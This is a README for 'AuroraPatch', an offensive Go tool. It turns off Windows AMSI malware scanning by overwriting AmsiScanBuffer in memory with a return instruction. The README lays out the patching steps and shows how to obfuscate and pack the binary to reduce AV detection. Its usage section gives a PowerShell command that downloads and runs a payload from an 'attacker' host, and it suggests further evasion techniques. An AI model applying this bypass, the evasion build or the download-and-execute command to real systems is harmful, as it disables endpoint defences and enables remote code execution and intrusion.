# AuroraPatch: AMSI Bypass Tool in Go

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/46cf574b-9449-4248-9785-eebb5cf72d01" />


![Go](https://img.shields.io/badge/Go-1.24.2-blue)
![License](https://img.shields.io/github/license/grisuno/amsi)

**AuroraPatch** is a lightweight, offensive Go tool that bypasses Windows AMSI (Anti-Malware Scan Interface) by patching the `AmsiScanBuffer` function in memory. Designed for red teamers and security researchers, it allows execution of scripts that would otherwise be blocked by Defender or other AMSI-integrated AVs.

> ⚠️ **For authorized use only.**  
> This tool is intended for penetration testing, ethical hacking, and educational purposes.

---

## 🌟 What is AMSI?

AMSI (Anti-Malware Scan Interface) is a Windows security feature that enables antivirus solutions to scan scripts (PowerShell, WMI, etc.) in real time. AuroraPatch demonstrates how AMSI can be bypassed by directly modifying memory in the current process.

---

## 🔧 How It Works

AuroraPatch performs the following steps:
1. Loads `amsi.dll` dynamically.
2. Resolves the address of `AmsiScanBuffer`.
3. Changes memory permissions using `VirtualProtectEx`.
4. Patches the first byte of `AmsiScanBuffer` with `0xC3` (`ret` instruction).
5. Restores original memory permissions.

<img width="1059" height="567" alt="image" src="https://github.com/user-attachments/assets/582f909d-4a4d-40b3-b575-ddc99934b618" />


## Result:  
✅ `AmsiScanBuffer` returns immediately — no scan occurs.  
🛡️ Effective for bypassing AMSI during post-exploitation.

> 🔁 **In-memory only**: Patch is volatile and lasts only for the current process.

---

<img width="1213" height="492" alt="image" src="https://github.com/user-attachments/assets/db5eb90a-7f63-4e68-a65e-5801a044f007" />

- Library Loading: Uses syscall.LoadLibrary("amsi.dll") to dynamically load the AMSI library
- Address Resolution: Calls syscall.GetProcAddress(amsi, "AmsiScanBuffer") to locate the target function
- Process Access: Opens current process with windows.OpenProcess() using PROCESS_VM_OPERATION|PROCESS_VM_WRITE flags
- Memory Protection: Modifies page permissions to PAGE_EXECUTE_READWRITE via windows.VirtualProtectEx()
- Patch Application: Writes single byte 0xc3 (x86 ret instruction) using windows.WriteProcessMemory()
- Permission Restoration: Returns original memory protection settings
- Resource Cleanup: Releases handles using windows.CloseHandle() and syscall.FreeLibrary()

<img width="1219" height="535" alt="image" src="https://github.com/user-attachments/assets/168d02ae-754b-443d-9850-4fc81cae4d9e" />

## Framework Compatibility
The tool integrates with red team frameworks through:

- Structured Configuration: YAML-based parameter management
- Command Automation: Predefined upload/execute/download sequences
- Non-Privileged Operation: Compatible with user-level access scenarios
- File Path Management: Standardized installation and execution paths

## Operational Security
Key OPSEC considerations for deployment:

- Detection Evasion: Binary uses obfuscation and compression
- Memory-Only Operation: No persistent artifacts
- Process Isolation: Affects only the execution process
- Temporary Effect: Bypass duration limited to process lifetime

## Development Tools
The following tools are essential for the development workflow:

- **garble**: Go code obfuscation tool for binary protection
- **upx**: Executable compression utility for size reduction
- **MinGW-w64**: Cross-compilation toolchain for Windows targets
- **Git**: Version control and collaboration

## Cross-Platform Development Considerations

### Target Platform Matrix

```text
  Development Host	  Target Platform	Cross-Compilation
- Linux       x86_64	Windows x86_64	Go + MinGW-w64
- macOS       x86_64	Windows x86_64	Go + MinGW-w64
- WSL2	              Windows x86_64	Go + MinGW-w64
```

## ⚠️ Legal & Ethical Disclaimer

This tool is **strictly for educational and authorized security assessments**.  
Unauthorized use may violate laws or regulations.  
The author assumes **no liability** for misuse.

---

## 🛠️ Build Instructions

Compiles to a Windows executable using cross-compilation, obfuscation (`garble`), and compression (`UPX`).

### Prerequisites
- Go 1.24.2+
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- `garble` (Go obfuscator)
- `upx`

### Go Module Dependencies

```text
Package	                  Purpose	Usage Location
fmt	                      Formatted I/O operations	Error messages and user output
syscall	                  System call interface	Windows API access for LoadLibrary/GetProcAddress
unsafe	                  Unsafe pointer operations	Memory address manipulation
golang.org/x/sys/windows	Windows-specific system calls	Advanced Windows API functions
```

Install `garble`:
```bash
go install github.com/burrowers/garble@latest
```
Build (from Linux/WSL)
```bash
make windows
```
or just:

```bash
./install.sh
```


Output:
amsi.exe  # Obfuscated, compressed Windows executable

- ✅ Binary is obfuscated with garble -literals -tiny and packed with UPX to reduce detection. 

## ▶️ Usage

Run on target Windows system:

```cmd
amsi.exe
```

```powershell
.\amsi.exe
```

<img width="425" height="441" alt="image" src="https://github.com/user-attachments/assets/3d06033c-72b0-4318-9022-49a9f71a0e99" />

Expected output:
```cmd
[+] AMSI patched: AmsiScanBuffer replaced with ret
AMSI bypass successful. Test with PowerShell or WMI scripts.
```
Now execute blocked scripts:
```powershell
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

🔄 Patch only affects the current process. Restarting restores AMSI protection. 

## 🧹 Clean Build Artifacts

```bash
make clean
```

## 📂 Project Structure

```text
├── amsi.go        # Main logic: AMSI patching via Windows API
├── go.mod         # Go module definition
├── go.sum         # Dependency checksums
└── Makefile       # Cross-compilation and obfuscation rules
```

## 🧲 Technical Details
- Uses golang.org/x/sys/windows for low-level Windows API access.
- No external dependencies beyond standard Go and x/sys.
- Direct memory manipulation via:
- LoadLibrary / GetProcAddress
- OpenProcess
- VirtualProtectEx
- WriteProcessMemory

## 🛑 Detection & Evasion
- Static (AV)
- Reduced via
- garble + UPX
- Dynamic (EDR)
- May trigger on memory RWX, process injection
- Persistence
- None (in-memory only)

💡 Tip: Combine with other evasion techniques (sleep masking, API unhooking, etc.) for better stealth.

## 📚 References
- Microsoft AMSI Docs
- garble - Go Obfuscator
- UPX Executable Packer


![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
